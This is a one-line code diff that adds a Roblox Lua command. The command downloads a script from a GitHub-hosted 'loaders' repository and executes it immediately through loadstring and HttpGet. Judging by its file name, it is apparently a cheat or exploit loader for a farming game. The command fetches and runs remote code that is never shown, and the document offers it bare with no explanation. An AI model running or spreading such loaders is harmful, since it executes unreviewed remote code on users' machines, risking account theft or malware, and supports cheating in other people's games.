@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/prehistoric-farm-new-world-spam0-4x9xr4wzfyq477.lua"))()
